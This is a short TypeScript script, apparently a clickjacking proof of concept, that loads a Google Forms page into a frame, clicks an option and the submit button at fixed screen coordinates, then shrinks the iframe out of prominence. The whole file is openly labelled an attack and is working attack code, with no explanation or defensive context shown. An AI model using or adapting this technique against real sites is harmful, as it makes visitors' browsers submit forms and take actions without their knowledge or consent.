import { Frame } from '../../library/frame/index.ts'
import { sleep } from '../../library/utils.ts'

async function main() {
  console.log('Starting attack')

  using frame = new Frame(1000, 1000)
  await frame.load('https://forms.gle/ZEBK8v684ARcuh1o9')
  console.log('Frame loaded')

  await frame.fullscreenClick({ x: 215, y: 288 })
  console.log('Clicked option')

  await frame.fullscreenClick({ x: 226, y: 365 })
  console.log('Clicked submit')

  await sleep(1000) // Wait for the form to submit

  console.log('Success')

  const iframe = frame.retriveFrame()
  iframe.style = 'width: 400px; height: 350px'
}

main()
